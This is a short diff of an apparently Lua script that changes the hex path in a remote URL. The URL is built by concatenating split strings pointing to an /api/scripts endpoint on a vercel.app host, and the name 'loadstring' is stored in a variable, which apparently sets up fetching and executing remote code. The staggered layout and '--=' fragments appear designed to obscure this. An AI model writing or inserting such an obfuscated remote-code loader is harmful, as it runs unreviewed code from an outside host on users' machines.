@@ -4,7 +4,7 @@
                     d='kohub-frontend'
                    e='.vercel.app'
                  f='/api/scripts'
-                g='/cfda3098e4c11f1a3c5d43545acef15f'--=
+                g='/b393eec810d0cc56591c22a859f7b745'--=
                h = 'loadstring';--=
               i=a..b..c--=
              k=i..d..e .. f .. g; --=
